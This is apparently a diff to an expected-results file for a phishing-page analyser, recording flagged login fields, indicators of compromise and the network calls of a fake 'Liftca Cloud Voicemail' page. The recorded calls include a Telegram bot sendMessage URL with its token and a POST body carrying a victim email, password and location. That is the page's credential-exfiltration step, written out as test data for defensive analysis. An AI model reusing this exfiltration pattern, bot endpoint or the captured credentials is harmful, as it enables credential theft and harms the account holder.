@@ -5,7 +5,7 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "HTML document has password / email / username input fields\n\t- <input> element 'UserEmail' contains the following phishing terms: 'email'\n\t- <input> element 'floatingInput' contains the following phishing terms: 'email'\n\t- <input> element 'floatingPassword' contains the following phishing terms: 'password'",
+        "body": "HTML document has password / email / username input fields\n\t- <input> element 'UserEmail' contains the following phishing terms: 'email, mail'\n\t- <input> element 'floatingInput' contains the following phishing terms: 'email, mail'\n\t- <input> element 'floatingPassword' contains the following phishing terms: 'password'",
         "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
@@ -288,7 +288,80 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"Liftca.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"api.telegram.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"cdnjs.cloudflare.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"ia801500.us.archive.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"ip.seeip.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"liftca.org\"}, {\"ioc_type\": \"domain\", \"ioc\": \"logo.clearbit.com\"}, {\"ioc_type\": \"ip\", \"ioc\": \"127.0.0.1\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://ia801500.us.archive.org/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://ip.seeip.org/geoip\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://logo.clearbit.com/liftca.org\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/ajax/libs/zepto/1.2.0/zepto.min.js\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/geoip\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/liftca.org\"}]",
+        "body": [
+          {
+            "ioc": "Liftca.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "api.telegram.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "cdnjs.cloudflare.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ia801500.us.archive.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "ip.seeip.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "liftca.org",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "logo.clearbit.com",
+            "ioc_type": "domain"
+          },
+          {
+            "ioc": "127.0.0.1",
+            "ioc_type": "ip"
+          },
+          {
+            "ioc": "https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ia801500.us.archive.org/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://ip.seeip.org/geoip",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "https://logo.clearbit.com/liftca.org",
+            "ioc_type": "uri"
+          },
+          {
+            "ioc": "/34/items/7164025490-20221107-091147/7164025490_20221107_091147.mp3",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/ajax/libs/zepto/1.2.0/zepto.min.js",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/geoip",
+            "ioc_type": "uri_path"
+          },
+          {
+            "ioc": "/liftca.org",
+            "ioc_type": "uri_path"
+          }
+        ],
         "body_config": {
           "column_order": [
             "ioc_type",
@@ -344,7 +417,24 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 11/8/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
+        "body": [
+          {
+            "method": "get",
+            "url": "https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"
+          },
+          {
+            "method": "get",
+            "url": "https://ip.seeip.org/geoip"
+          },
+          {
+            "method": "post",
+            "request_body": {
+              "chat_id": "-571909261",
+              "text": "///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\n\nEmail: jami.reich@liftca.org\nPassword : JsJ@w$==C00l!\nIP Address : 127.0.0.1\nRegion : Ottawa\nCity : Ottawa\nCountry : Canada\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\nFormat : 103,000=371,800\nDate Filled : 11/17/2023\nDateSent : 12/12/2022 8:01:03 a.m."
+            },
+            "url": "https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage"
+          }
+        ],
         "body_config": {
           "column_order": [
             "url",
